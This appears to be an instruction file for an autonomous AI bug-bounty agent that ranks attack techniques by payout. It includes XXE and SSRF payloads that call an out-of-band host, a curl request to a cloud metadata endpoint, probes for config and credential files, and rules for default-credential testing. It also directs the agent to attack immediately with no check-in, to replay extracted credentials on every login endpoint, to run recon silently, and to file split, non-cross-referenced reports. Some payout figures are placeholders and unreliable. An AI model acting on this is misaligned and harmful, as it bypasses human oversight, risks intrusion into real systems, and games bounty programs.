---
disable-model-invocation: true
---

# Arsenal Index v1.0 — Auto-Selector
**Owner: cyber-operator**
**Trigger:** Called automatically at start of every whitehat session after Phase 0 pre-read
**Purpose:** Single source of truth. Maps target's tech stack/scope to applicable techniques. Returns classified attack surface with auth requirements, payout ceilings, and depletion factors.

---

## How This Works

```
Input:  Scope page (domains, tech stack, platform, payout table, OOS list)
        + your program index (depletion registry)
        + Tech fingerprint from recon (stack, headers, JS libraries)
Process: Cross-reference against 154+ technique files
Output:  Three-column attack surface classification:
         - Zero-Auth Track (execute immediately)
         - Auth-Creatable Track (auto-create account + execute)
         - Auth-Gated Track (score only, present in final report)
```

---

## Classification Rules

### OOB Infrastructure (Provision FIRST — Before Any Payload)

Before executing any Zero-Auth or Auth-Creatable vector, provision an Interactsh token. Blind SSRF, XXE, and command injection findings require OOB callbacks to confirm — without this, ~20% of SSRF-class findings are missed.

```bash
# Provision token (takes <5s):
interactsh-client -server oast.pro -n 1
# → FQDN: abc123.oast.pro (unique per session)

# Embed in all SSRF/XXE/SSTI payloads:
# SSRF:  url=http://abc123.oast.pro/ssrf-test
# XXE:   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://abc123.oast.pro/xxe">]>
# SSTI:  {{url_for('static', filename='')}}http://abc123.oast.pro/ssti

# Signal classification (see interactsh-workflow.md):
# DNS-only callback → Blind SSRF/XXE confirmed → Medium (CVSS 6.9)
# HTTP callback     → SSRF confirmed + server executes → High (CVSS 8.0)
# IMDS creds in body → Critical SSRF chain (CVSS 9.3)
```

**Full OOB workflow:** `interactsh-workflow.md`

---

### Zero-Auth (Execute Immediately — No Check-In)
Anything exploitable WITHOUT login:
- SSRF on public endpoints
- Source map / JS bundle analysis
- Open redirect on unauthenticated paths
- GraphQL introspection on public endpoints
- File upload on public forms (pre-login)
- Subdomain takeover via DNS
- CRLF injection in HTTP headers
- HTTP parameter pollution
- Public API key/credential exposure
- DNS rebinding on public hostnames
- Web cache deception on cached public pages
- XXE on unauthenticated XML endpoints
- SSTI in public-facing templates
- Error-based information disclosure
- TLS/cipher misconfiguration
- **Default credentials on admin panels** (CWE-1392) — check /admin, /manager, /console, /dashboard
- **Password/credentials in config files** (CWE-260) — probe /.env, /config.php, /wp-config.php, /application.properties
- **LLM Prompt Injection on public AI features** (CWE-1427) — YesWeHack ACCEPTS as of Feb 2026

PRE-PROD FEATURE FLAG PATTERN (Zero-Auth):
  Technique: URL params trigger pre-production JS loading in production environment
  Test params: ?previewApp=N, ?preview=1, ?staging=true, ?debug=1, ?qa=true, ?beta=true
  Method:
    1. Load main bundle JS
    2. Search for: localStorage, location.search, URLSearchParams
    3. Identify params that override feature flags or load different JS bundles
    4. Test: does ?previewApp=N load unreleased features, expose backend API calls, or
       return data from non-production environments?
  Auth required: NO | Weaponizable: YES (link-based attack)
  Filing asset: Production domain (not preview subdomain)
  EV ceiling: $10K if pre-prod data exposed | $500–$2K for unreleased feature exposure

### Auth-Creatable (Auto-Create Account — Then Execute)
Auth needed BUT a free public account can be self-registered:
- JWT algorithm confusion (RS256→HS256, alg:none)
- IDOR on user-owned resources
- CORS misconfiguration with credentialed requests
- Race conditions on rate-limited actions (OTP, coupons)
- Mass assignment / BOPLA on create/update endpoints
- GraphQL IDOR / batching abuse
- Business logic bypass (coupon reuse, negative price)
- Auth flow vulnerabilities (OAuth redirect_uri, PKCE bypass)
- Session fixation / cookie scope issues
- H2 desync attacks requiring session

RESOURCE-DEPENDENT IDOR FLAG:
  IF vector = IDOR on resource IDs (billing subscriptions, DNS zones, WHOIS records,
     order IDs, payment methods, file IDs):
    → MANDATORY CHECK: Do test accounts need PURCHASED resources to generate exploitable IDs?
    → If YES: Add to classification output before sweep executes:
      ⚠️ RESOURCE REQUIRED: [resource type]
         Estimated cost: ~$[X]
         Expected EV if confirmed: $[Y]
         ROI: [N]x — Recommend: [purchase before sweep / flag for review]
    → Do NOT run sweep, fail, then flag. Flag BEFORE execution.

### Auth-Gated (Score Only — Hard Lock Until Explicit Unlock)
Requires privileged / internal / admin account:
- Admin panel access / privilege escalation
- Internal API endpoints
- Employee-only SSO / SAML flows
- Multi-tenant IDOR across organizations
- Any vector explicitly requiring a role not publicly self-registerable

### OS/Network Track (Auto-Activates When IP/Server Scope Detected)

> **Activation triggers (any one is sufficient):**
> - Scope includes IP address, CIDR range, or hostname with known server software
> - Program scope lists "infrastructure", "network", "server", or "OS"
> - CTF box with IP address provided (HTB, THM, Vulnhub)
> - SSH/nmap/server keywords in scope description
>
> When OpenBSD fingerprint detected: auto-load `openbsd-hardening-reference.md`

**Zero-Auth OS/Network vectors (execute immediately, no check-in):**
- Service enumeration: port scanning, banner grabbing, OS fingerprinting
- SSH version/cipher audit (ssh-audit — reads banner + negotiates, no auth)
- DNS zone transfer (AXFR) and PTR reverse lookup
- Default credential test on exposed services (max 3 attempts per username)
- FTP anonymous access test
- Redis/Elasticsearch/MongoDB no-auth check
- SMTP open relay + VRFY user enumeration
- NFS export enumeration (showmount -e)
- SMB null session + share enumeration
- Version CVE correlation (WebSearch per detected service version)

**Auth-Creatable OS/Network vectors (requires shell access):**
- Linux/BSD local privilege escalation: SUID, sudo, writable cron, kernel exploits
- Network pivoting: internal network discovery, SSH tunnel, SOCKS proxy
- PF ruleset read and analysis (if doas permits pfctl)
- SSH agent forwarding abuse (lateral movement)
- Writable /etc/passwd or rcctl service scripts

**Auth-Gated OS/Network (explicit unlock only):**
- Admin management interfaces (IPMI, iDRAC, remote console)
- Root-only configuration files (/etc/shadow, etc.)
- Multi-tenant infrastructure privilege escalation

---

## Payout Weight Table (v1.0 — 2026-04-19)

> **Origin:** General bug-bounty economics. Info-disclosure findings rarely pay out
> compared to real vulns (SSRF, IDOR, precision loss, rate bypass).
> This table ensures the arsenal prioritizes what PAYS, not what's EASY.

| Technique Class | Payout Weight | Historical Basis |
|----------------|---------------|-----------------|
| SSRF (cloud chain / IMDS) | **10.0x** | Example SSRF payout to an example program. |
| CI/CD Injection (pull_request_target, artifact poisoning) | **9.0x** | Commonly $4K-$10K on mature programs |
| IDOR (cross-user data access) | **8.0x** | Industry standard High/Critical on all platforms |
| Race Condition (TOCTOU, H2 single-packet) | **7.0x** | Business-logic class, high acceptance rate |
| Auth Bypass (OAuth redirect_uri, PKCE, JWT confusion) | **7.0x** | Swiss Post, Paddle leads in pipeline |
| Business Logic (negative price, coupon reuse, flow skip) | **7.0x** | Unique per target, low dup rate |
| RCE / Command Injection | **10.0x** | Critical on every program, rare but max payout |
| XSS (Stored / DOM-based with chain) | **5.0x** | Common but accepted; must have impact chain |
| Mass Assignment / BOPLA | **6.0x** | API-focused programs pay well for this |
| GraphQL (batching, IDOR, introspection + exploitation) | **6.0x** | Growing class, moderate acceptance |
| Prototype Pollution / Deserialization | **6.0x** | Rare finds, high payout when confirmed |
| Default Credentials (admin panel access) | **4.0x** | Quick win but often Low severity |
| XXE (with data exfil or SSRF chain) | **8.0x** | High payout when OOB confirms |
| Open Redirect (standalone) | **1.0x** | Usually OOS or Informative. Chain-only value. |
| Subdomain Takeover | **2.0x** | Saturated vector, many programs exclude |
| Source Map / JS Bundle Analysis | **0.1x** | **RECON-ONLY. Never file. Use as exploitation input.** |
| Sentry DSN Exposure | **0.0x** | **NEVER FILE. Zero payouts. Zero accepted.** |
| API Schema / OpenAPI Docs Exposure | **0.1x** | **RECON-ONLY. FastAPI/Swagger defaults ≠ vuln.** |
| Config / Feature Flag Exposure | **0.5x** | File ONLY if creds are live + exploitable |
| Internal Hostname / Path Disclosure | **0.1x** | **RECON-ONLY unless chained to exploitation.** |
| Git Hash / Build Info Disclosure | **0.0x** | **NEVER FILE standalone. Zero value.** |

### RECON-ONLY Class (NEVER FILE — use as input to exploitation)

These vector types are reclassified as **Phase 1 recon intelligence only**:
- Source maps → READ the code, find the IDOR/auth bug, file THAT
- API schema exposure → MAP the endpoints, test for IDOR/SSRF, file THAT
- JS bundle endpoint enumeration → IDENTIFY admin paths, test auth bypass, file THAT
- Sentry DSN → IGNORE unless you can submit events with PII
- Config/feature flags → ONLY file if live credentials confirmed exploitable
- Internal hostnames → USE for targeted SSRF payloads, don't file standalone

**Rule:** If the finding verb is "exposed" or "disclosed" — it's recon. If the verb is
"accessed", "bypassed", "exfiltrated", or "executed" — it's a finding.

---

## Selector Logic

```
STEP 1 — Ingest scope page:
  Read: domains in-scope, wildcard patterns, platform type
  Read: explicit OOS list (rate limiting, self-XSS, etc.)
  Read: payout table (Critical/High/Medium/Low ceilings)
  Read: tech stack clues (JS frameworks, CDN, auth provider)

STEP 1b — PROGRAM SATURATION FILTER (MANDATORY):
  Determine program age (launch date from program page):

  Program age < 30 days:   Saturation = 1.0x → all technique classes eligible
  Program age 30–90 days:  Saturation = 0.7x → deprioritize generic vectors
  Program age > 90 days:   Saturation = 0.4x → generic vectors LAST, not FIRST

  Saturation multiplier applies to (these techniques DEPRIORITIZED on mature programs):
    SSRF (basic), XSS (basic reflected), IDOR (sequential integer IDs), CORS wildcard,
    Open Redirect, subdomain takeover (standard CNAME)

  NOT affected by saturation (these stay high-priority regardless of age):
    Attack chains, business logic, CI/CD injection, dependency confusion, XS-Leaks,
    prototype pollution, novel tech-stack-specific vectors

  Updated EV formula: EV = payout_ceiling × confidence × uniqueness_score × saturation_factor × (1 - dup_probability)
  dup_probability comes from dedup-intelligence.md (TIER 2.5) — see the EV formula

STEP 1c — WAF DETECTION (Mandatory before payload execution):
  Send probe: GET /search?q=<script>alert(1)</script>
  Check response for WAF signals:
    cf-ray header or Server: cloudflare         → WAF=Cloudflare → load waf-bypass-engine.md Track A
    x-amzn-requestid or {"message":"Forbidden"} → WAF=AWS WAF   → load waf-bypass-engine.md Track B
    mod_security or NAXSI in body               → WAF=ModSec    → load waf-bypass-engine.md Track C
    HTTP 403 without above signals              → WAF=Generic   → load waf-bypass-engine.md Track D
    HTTP 200 → no WAF detected → proceed with standard payloads
  Rule: If WAF detected AND standard payload returns 403 → Sub-Agent E (WAF bypass) activates.
  Full bypass methodology: waf-bypass-engine.md

STEP 2 — Fingerprint check (from recon agent):
  Stack detected? → filter to applicable technique files + auto-load framework skill:
    Next.js detected (x-powered-by: Next.js, _next/static, __NEXT_DATA__)
      → auto-load nextjs-security.md — covers /_next/image SSRF, Server Actions CSRF, middleware bypass
    SvelteKit detected (/_app/immutable/, __data.json, hx-* attrs)
      → auto-load sveltekit-security.md — covers +server.js CSRF, load() SSRF, form action bypass
    htmx detected (hx-get/hx-post in HTML, HX-Request header response)
      → auto-load htmx-security.md — covers hx-* injection sinks, CORS+AJAX, SSE injection
    Rust detected (actix-web server header, Rust panic in errors, cargo patterns)
      → auto-load rust-app-security.md — covers serde deserialization, integer wrap, reqwest SSRF
  No stack yet? → include all technique files, flag "unconfirmed"

STEP 3 — Depletion filter (from your program index):
  For each technique:
    Check HARD BLOCKS table → if match → CUT (don't include)
    Check DEPLETED VECTORS table → apply depletion multiplier
    If adjusted uniqueness < 15% → AUTO-CUT

STEP 4 — Classify each surviving technique:
  auth_required = FALSE → Zero-Auth Track
  auth_required = TRUE AND account_type = "public" → Auth-Creatable Track
  auth_required = TRUE AND account_type = "privileged" → Auth-Gated Track

STEP 4b — RECON-ONLY FILTER (v1.0 — 2026-04-19):
  For each technique in Zero-Auth track:
    Check Payout Weight Table → if weight ≤ 0.1x → RECLASSIFY as RECON-ONLY
    RECON-ONLY vectors:
      - Execute SILENTLY in Phase 1 (keep internal)
      - Output feeds Phase 2 exploitation (source maps → read code → find bug)
      - NEVER drafted as reports, NEVER scored, NEVER filed
    Remove from fileable vector list. Keep in recon output feed.

STEP 5 — Sort by PAYOUT-WEIGHTED EV (v2.0 — 2026-04-19):
  Weighted_EV = payout_ceiling × confidence × uniqueness_score × PAYOUT_WEIGHT × saturation_factor × (1 - dup_probability)
  
  PAYOUT_WEIGHT = lookup from Payout Weight Table above
  dup_probability = 0.30 default until dedup-intelligence.md runs in TIER 2.5
  
  CRITICAL CHANGE: Auth-Creatable vectors now sort ALONGSIDE Zero-Auth.
  The old system ran Zero-Auth first, Auth-Creatable second.
  The new system ranks ALL vectors by Weighted_EV regardless of auth track.
  An 8.0x IDOR (auth-creatable) outranks a 0.1x source map (zero-auth) ALWAYS.
  
  Present top-3 overall (not per-track). These are what get POC'd.
  
  EXECUTION ORDER:
    1. Top-3 by Weighted_EV → POC attempt (20 min each, 60 min total)
    2. If top-3 includes auth-creatable → account creation runs FIRST (Phase 2)
    3. Zero-auth recon runs in PARALLEL with account creation (not sequentially)
    4. POC-or-Kill gate on each → file only what passes
```

---

## Tool Registry v2.0 (Updated 2026-04-11)

### Recon Tools (NEW — replaces crt.sh-only pipeline)

| Tool | Install | Purpose |
|------|---------|---------|
| `subfinder` | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` | Multi-source passive subdomain enumeration |
| `amass` | `go install github.com/owasp-amass/amass/v4/...@master` | OWASP subdomain enum (use -passive only on BB) |
| `assetfinder` | `go install github.com/tomnomnom/assetfinder@latest` | Fast passive subdomain finder |
| `httpx` | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` | Live host resolution + tech fingerprint |
| `masscan` | `winget install masscan` or pkg manager | Ultra-fast port scanning for large CIDR (/16+) — Step 0 before nmap in Overseer 8. Rate: 1000 max. |

### JS Analysis Tools (NEW)

| Tool | Install | Purpose |
|------|---------|---------|
| `linkfinder` | `pip install linkfinder` | Extract URLs/endpoints from JS bundles |
| `secretfinder` | `pip install secretfinder` | Secret/credential regex patterns for JS files |
| `trufflehog` | `go install github.com/trufflesecurity/trufflehog/v3@latest` | Deep secret scanning (git/file/blob) |

### Fuzzing Tools (NEW)

| Tool | Install | Purpose |
|------|---------|---------|
| `ffuf` | `go install github.com/ffuf/ffuf/v2@latest` | Fast web fuzzer — directory/parameter discovery |
| SecLists wordlists | `git clone https://github.com/danielmiessler/SecLists` | Comprehensive wordlist collection |

### Protocol Tools (NEW)

| Tool | Install | Purpose |
|------|---------|---------|
| `grpcurl` | `go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest` | gRPC reflection + method testing |

---

## Companion Vector Algorithm (CVA v1.0)

> General guidance: strong bug bounty hunters file 3-8 reports per session
> because they apply the Companion Vector Protocol — find one, sweep all related.

### Rule: When you find vuln X, IMMEDIATELY test companion vectors before filing anything.

```
COMPANION_VECTOR_PROTOCOL(primary_finding):

  1. HOLD THE REPORT — Do not file yet.

  2. LOOK UP companion vectors:

     IDOR detected:
       → Test: Access Control (CWE-284) on same endpoints
       → Test: Mass Assignment (add id/role fields to POST body)
       → Test: CORS (credentialed request from attacker origin)
       → Test: Batch endpoint bypass (/batch, /export, /bulk)

     XSS Reflected detected:
       → Test: HTML Injection (simpler payload, same param)
       → Test: Open Redirect (same URL params, redirect value)
       → Test: Stored XSS (same param via POST, does it persist?)
       → Test: DOM-based XSS (check JS handling of same param)

     SSRF detected:
       → Test: Default Credentials on admin panels (lateral move)
       → Test: Path Traversal (same URL param, different value)
       → Test: Info Disclosure (error responses with internal data)
       → Test: Cloud IMDS if AWS/GCP (escalate to cloud chain)

     Path Traversal detected:
       → Test: File Upload bypass (can you write as well as read?)
       → Test: Config/credential exposure (target .env, config.php)
       → Test: Log file access (/var/log/nginx/access.log, etc.)

     Default Credentials detected:
       → Test: Password in Config files (/.env, /config.*)
       → Test: SSRF via admin panel features (fetch URL, webhook)
       → Test: RCE via admin panel (script console, WAR deploy, etc.)
       → Extract all credentials → replay on all login endpoints

     SQLi detected:
       → Test: Error-based info disclosure (different inject syntax)
       → Test: Access Control bypass (tautology: OR 1=1)
       → Sweep ALL similar params horizontally (same pattern)

     LLM Injection (CWE-1427) detected:
       → Test: Data exfil via AI output (indirect injection)
       → Test: Prompt injection in all AI input fields
       → Test: System prompt extraction

  3. RUN BURST SWEEP on the primary vuln class:
     → Map ALL similar endpoints / params across the app
     → Replay the working payload across all candidates
     → Confirm each instance independently
     → Target: 3-5 confirmed instances before filing

  4. FILE BATCH:
     → Each confirmed instance = separate standalone report
     → All filed within same session
     → Do NOT cross-reference reports (each must stand alone)
```

### Burst Sweep Trigger (when to activate)

| Signal | Action |
|--------|--------|
| First IDOR confirmed | Start burst sweep — map all resource endpoints |
| First XSS Reflected confirmed | Spider all GET params across app |
| First SSRF confirmed | Run default creds + path traversal chain |
| First SQLi confirmed | Enumerate all filter/search/export params |
| First Default Creds confirmed | Run config sweep + admin panel capability chain |

---

## Technique File Registry

> These are the technique files cross-referenced during classification.
> Each file contains: payout_ceiling, auth_required, account_type, autonomy_level, POC_instructions

### Web Track
| Technique | File | Auth | Account Type | Ceiling | Burp Tool |
|-----------|------|------|--------------|---------|-----------|
| XSS (Stored/Reflected/DOM) | Cyber-XSS-*.md | NO | public | $5K–$25K | Repeater + DOM Invader BApp |
| SSTI | Cyber-SSTI.md | varies | public | $10K–$50K | Repeater |
| CSTI | Cyber-CSTI.md | NO | — | $5K–$10K | Repeater |
| CRLF Injection | Cyber-CRLF-Injection.md | NO | — | $500–$2K | HTTP Request Smuggler BApp |
| SQL Injection | Cyber-SQL-Injection.md | varies | public | $10K–$100K | Intruder (Sniper) + Repeater |
| XXE | Cyber-XXE.md | NO | — | $5K–$25K | Repeater + interactsh (OOB) |
| LDAP Injection | Cyber-LDAP-Injection.md | NO | — | $2K–$10K | Repeater |
| Command Injection | Cyber-Command-Injection.md | NO | — | $25K–$100K | Repeater + interactsh (OOB) |
| SSRF | Cyber-SSRF-*.md | NO | — | $10K–$100K | Repeater + interactsh |
| Open Redirect | Cyber-Open-Redirect.md | NO | — | $100–$2K | Proxy History filter |
| HTTP Parameter Pollution | Cyber-HTTP-Parameter-Pollution.md | NO | — | $500–$5K | Repeater |
| Path Traversal / LFI | Cyber-Path-Traversal-LFI.md | varies | public | $5K–$50K | Repeater |
| File Upload Exploitation | Cyber-File-Upload.md | NO | — | $10K–$100K | Repeater (multipart bypass) |
| H2 Desync | Cyber-H2-Desync-Attacks.md | varies | public | $10K–$50K | Repeater (HTTP/2 mode) |
| Web Cache Deception | Cyber-Web-Cache-Deception.md | varies | public | $5K–$25K | Param Miner BApp |
| Integer Overflow | Cyber-Integer-Overflow-Web.md | varies | public | $5K–$50K | Repeater |
| Clickjacking | Cyber-Clickjacking.md | NO | — | $100–$500 | Proxy History |

### Auth / API Track
| Technique | File | Auth | Account Type | Ceiling | Burp Tool |
|-----------|------|------|--------------|---------|-----------|
| JWT Algorithm Confusion | Cyber-JWT-Algorithm-Confusion.md | YES | public | $5K–$25K | Decoder + Repeater |
| OAuth / OIDC Abuse | Cyber-OAuth-*.md | YES | public | $25K–$100K | Proxy History + Repeater |
| IDOR | Cyber-IDOR-*.md | YES | public | $5K–$50K | Autorize BApp + Repeater |
| CORS Misconfiguration | Cyber-CORS-*.md | YES | public | $5K–$25K | Proxy History filter + Repeater |
| Race Conditions | Cyber-Race-*.md | YES | public | $10K–$50K | Turbo Intruder BApp |
| Mass Assignment | Cyber-MassAssignment-BOPLA.md | YES | public | $10K–$25K | Repeater |
| GraphQL Abuse | Cyber-GraphQL-*.md | varies | public | $10K–$25K | InQL BApp + Repeater |
| gRPC Security | Cyber-gRPC-Security.md | varies | public | $5K–$25K | Repeater (raw HTTP) |
| Service Worker Attacks | Cyber-Service-Worker-Attacks.md | YES | public | $5K–$25K | DOM Invader BApp |

### Cloud / Infra Track
| Technique | File | Auth | Account Type | Ceiling | Burp Tool |
|-----------|------|------|--------------|---------|-----------|
| AWS SSRF → IMDS | Cyber-SSRF-Cloud-Chain.md | NO | — | $50K–$100K | Repeater + interactsh |
| GitHub Actions Security | Cyber-GitHub-Actions-Security.md | NO | — | $5K–$25K | n/a (no HTTP proxy) |
| Subdomain Takeover | Cyber-Subdomain-Takeover-*.md | NO | — | $5K–$25K | n/a (DNS-level) |
| DNS Rebinding | Cyber-DNS-Rebinding.md | NO | — | $5K–$25K | n/a (DNS-level) |
| SSL Pinning Bypass | Cyber-SSL-Pinning-Bypass.md | YES | public | $5K–$25K | n/a (system proxy) |
| **Default Credentials** | **Cyber-Default-Credentials-Config-Exposure.md** | **NO** | **—** | **$1K–$10K** | **n/a (direct login)** |
| **Password in Config File** | **Cyber-Default-Credentials-Config-Exposure.md** | **NO** | **—** | **$2K–$15K** | **n/a (direct HTTP GET)** |

### OS/Network Track (IP/Server scope — auto-activates)
| Technique | File | Auth | Account Type | Ceiling | Tool |
|-----------|------|------|--------------|---------|------|
| Service Enumeration + OS Fingerprint | os-network-recon.md | NO | — | $500–$10K | nmap, nc, curl |
| SSH Cipher/Version Audit | ssh-audit-methodology.md | NO | — | $1K–$15K | ssh-audit |
| SSH Default Credentials | ssh-audit-methodology.md | NO | — | $2K–$10K | nc, manual |
| SSH Username Enumeration (CVE-2018-15919) | ssh-audit-methodology.md | NO | — | $1K–$5K | timing test |
| DNS Zone Transfer (AXFR) | network-attacks.md | NO | — | $500–$5K | dig |
| SMTP Open Relay | network-attacks.md | NO | — | $500–$5K | nc |
| FTP Anonymous Access | os-network-recon.md | NO | — | $500–$5K | ftp, nc |
| NFS World-Export | network-attacks.md | NO | — | $2K–$15K | showmount |
| Redis/MongoDB/ES No-Auth | os-network-recon.md | NO | — | $5K–$25K | nc, redis-cli |
| Local Privilege Escalation (SUID/sudo) | privilege-escalation.md | YES | shell | $5K–$25K | LinPEAS, find |
| OpenBSD doas Misconfiguration | privilege-escalation.md | YES | shell | $5K–$20K | doas -l |
| Network Pivot (SSH Tunnel) | network-attacks.md | YES | shell | $2K–$15K | ssh -D |
| OpenSMTPD CVE-2020-7247 RCE | network-attacks.md | NO | — | $10K–$50K | nc (version only) |
| OpenSSH CVE-2024-6387 (regreSSHion) | ssh-audit-methodology.md | NO | — | $10K–$50K | banner + version |

### Blockchain Track (Immunefi / DeFi programs only)
| Technique | File | Auth | Account Type | Ceiling |
|-----------|------|------|--------------|---------|
| EVM Reentrancy + Flash Loan | Cyber-EVM-Reentrancy-FlashLoan.md | NO | — | $500K–$2M |
| Bridge Replay Attack | Cyber-CrossChain-Bridge-*.md | NO | — | $1M–$15M |
| Ink! Chain RPC | Cyber-Ink-Chain-RPC-Access.md | NO | — | $50K–$500K |

### LLM / AI Track
| Technique | File | Auth | Account Type | Ceiling | Notes |
|-----------|------|------|--------------|---------|-------|
| LLM Indirect Injection | Cyber-LLM-Indirect-Injection-Exfil.md | varies | public | $25K–$100K | |
| **LLM Prompt Injection (CWE-1427)** | **ai-bounty-attacks.md** | **NO** | **—** | **$500–$10K** | **YWH ACCEPTS — Feb 2026 confirmed. Low competition.** |
| Electron Security | Cyber-Electron-Security.md | varies | public | $10K–$50K | |

### Full Vault Coverage (All Technique Files — Load by Name)
| Technique | File | Auth | Notes |
|-----------|------|------|-------|
| CI/CD Workflow Injection | cicd-attack-vectors.md | NO | ALWAYS load for GitHub org targets |
| Dependency Confusion | supply-chain-attacks.md | NO | Maven/npm/PyPI targets |
| Business Logic | business-logic-attacks.md | varies | ALWAYS load for gaming/fintech |
| XS-Leaks | xs-leaks.md | varies | Meta pays $8.4K/cluster |
| AI/LLM Attacks | ai-bounty-attacks.md | varies | 210% YoY H1 growth |
| Prototype Pollution | prototype-pollution.md | NO | JS apps with merge/clone libs; low dup rate |
| H2 Desync | h2-desync.md | NO | Burp Pro required; H2→H1 downgrade targets |
| JWT Algorithm Confusion | jwt-algorithm-confusion.md | YES | RS256→HS256, alg:none, kid injection |
| OAuth / OIDC Abuse | oauth-oidc-abuse.md | YES | redirect_uri, PKCE downgrade, OIDC sub confusion |
| CORS Misconfiguration | cors-misconfiguration.md | YES | Reflected origin + ACAC:true required for exploit |
| GraphQL Abuse | graphql-abuse.md + graphql-directive-fuzzer.md | NO/YES | Introspection (NO), BOLA/mutation (YES); directive fuzzer auto-loads with graphql-abuse |
| Mobile / APK Attacks | mobile-apk-attacks.md | YES | Frida/objection SSL bypass; exported components |
| OpenBSD server | os-network-recon.md + ssh-audit-methodology.md + openbsd-hardening-reference.md | NO | Auto-activate; SSH cipher audit, smtpd CVE check, PF bypass, service enum |
| Linux/BSD server | os-network-recon.md + privilege-escalation.md | NO/YES | Auto-activate; nmap 4-phase, ssh-audit, SUID/sudo PE, kernel exploit |
| Network infrastructure | os-network-recon.md + network-attacks.md | NO | Auto-activate on IP scope; port scan, DNS AXFR, SMTP relay, NFS export |

---

## SEVERITY TIER MATRIX (H1 Empirical 2025 Data — Use in Every Brief)

| Severity | CVSS Range | Avg Payout | Acceptance Rate | Dup Rate | Effort |
|----------|------------|------------|-----------------|----------|--------|
| Critical | 9.0–10.0 | $5K–$25K | 85% | 35% | HIGH |
| High | 7.0–8.9 | $1K–$10K | 80% | 40% | MED |
| Medium | 4.0–6.9 | $150–$1K | 70% | 55% | LOW |
| Low | 0.1–3.9 | $50–$300 | 50% | 65% | LOW |
| Info | 0 | N/A | 20% | 80% | LOW |

**Program Age Adjustment:**
- < 30 days: +15% acceptance, -20% dup rate (prime hunting)
- 30–90 days: baseline
- > 90 days: -10% acceptance, +25% dup rate (saturated)

**Vector-Specific Win Rates (YesWeHack 2026 intelligence + H1 empirical):**

| Vector | Win Rate | Notes |
|--------|----------|-------|
| IDOR (cross-account data confirmed) | 62% | High when proven |
| XSS Reflected | 45% | High dup rate |
| Business Logic | 78% | Low dup, program-specific |
| Default Credentials / Config Exposure | 70% | Most hunters skip — opportunity |
| LLM Prompt Injection (CWE-1427) | 67% | New class, low competition |
| SSRF OOB-only | 40% | Must escalate to HTTP or IMDS |
| SSRF + cloud metadata | 85% | High win when metadata reached |
| CORS (no ACAC) | 25% | Rarely paid |
| CORS + ACAC:true | 70% | Requires credential test |
| Dependency Confusion (callback confirmed) | 90% | Near-certain |
| CI/CD injection + POC | 82% | Strong evidence = strong report |
| JWT alg:none / RS256→HS256 | 72% | Common but scorable |
| Business Logic (negative quantity) | 80% | EASY WIN if reproduced |

**Use in brief:** For every finding in sweep brief, include win rate + EV estimate.

---

## Output Format (Per Session)

After classification, deliver this table to the reporting workflow:

```
ARSENAL CLASSIFICATION — [Program Name]
Total vectors evaluated: [N]
Hard-blocked (depletion/OOS): [N]

ZERO-AUTH TRACK ([N] vectors) — Execute immediately:
| # | Vector | Technique File | Est. EV | Confidence | POC Path |
|---|--------|---------------|---------|-----------|---------|
| 1 | SSRF on /api/fetch | Cyber-SSRF-Cloud-Chain.md | $45K | 75% | curl -X POST /api/fetch -d url=http://169.254.169.254/latest/meta-data/ |

AUTH-CREATABLE TRACK ([N] vectors) — Auto-create account, then execute:
| # | Vector | Technique File | Est. EV | Account Type | POC Path |
|---|--------|---------------|---------|-------------|---------|

AUTH-GATED TRACK ([N] vectors) — Scored only, lock until unlock:
| # | Vector | Technique File | Est. EV | Required Access | Notes |
|---|--------|---------------|---------|----------------|-------|
```

---

## Stack → Technique Mapping (Quick Reference)

| Detected Stack | High-Priority Techniques | Auto-Include |
|---------------|--------------------------|--------------|
| React/Next.js | DOM XSS, SSTI in templates, source maps, prototype pollution → **auto-load nextjs-security.md** | YES |
| SvelteKit | +server.js CSRF, load() SSRF, ?/actionName bypass → **auto-load sveltekit-security.md** | YES |
| htmx | hx-* attribute injection, CORS+AJAX steal, SSE injection → **auto-load htmx-security.md** | YES |
| Rust (Actix/Axum/Rocket) | serde deserialization, integer wrap, reqwest SSRF, unsafe blocks → **auto-load rust-app-security.md** | YES |
| GraphQL | Introspection, directive deception, batching, IDOR | YES |
| AWS hosting | SSRF→IMDS, S3 enum, Lambda env vars | YES |
| JWT auth | Algorithm confusion, alg:none, kid injection | YES |
| OAuth2/OIDC | redirect_uri bypass, state fixation, device code phishing | YES |
| Frappe/ERPNext | User enum via reset_password, auth bypass patterns | YES |
| Spring Boot | Actuator exposure, deserialization, path traversal | YES |
| DeFi/EVM | Reentrancy, flash loan, bridge replay | YES |
| Electron app | Nodeintegration, contextIsolation bypass, protocol handler | YES |
| Mobile (APK) | SSL pinning bypass, exported components, deep link abuse | Auth-Gated |
| Cognito (AWS) | Token manipulation, user pool enum, identity pool misconfig | Auth-Creatable |

---

---

## A2A-Enabled Tools

Arsenal tools now can feed a shared cache. Each tool output can be consumed by later stages — either cached to a shared local state file or handed off to the next stage.

| Tool | Consuming Agent | A2A Pattern | Cache Key Written |
|------|----------------|-------------|-------------------|
| `subfinder` | recon-agent | CACHE output after run | `recon.{target}.subdomains` |
| `amass` | recon-agent | CACHE output after run | `recon.{target}.subdomains` |
| `assetfinder` | recon-agent | CACHE output after run | `recon.{target}.subdomains` |
| `httpx` | recon-agent | CACHE tech fingerprint | `recon.{target}.tech_stack` |
| `gobuster` | recon-agent | CACHE directory discovery | `recon.{target}.discovered_paths` |
| `nuclei` | cyber-operator | DELEGATE from ai-sec-agent for LLM template fuzzing | n/a |
| `sqlmap` | cyber-operator | Active testing — no cache | n/a |
| `ffuf` | cyber-operator | Active testing — no cache | n/a |
| `linkfinder` | builder (via cyber-operator DELEGATE) | JS endpoint extraction | n/a |
| `secretfinder` / `trufflehog` | cyber-operator | Active — findings to report | n/a |

**Rule:** recon tools (subfinder, amass, gobuster, httpx) can write to a shared local cache after completion so later stages start from the same surface map without re-running discovery.

*Arsenal Index v1.0 — Auto-Selector | Whitehating System v2.0 | A2A-enabled | 2026-04-18*
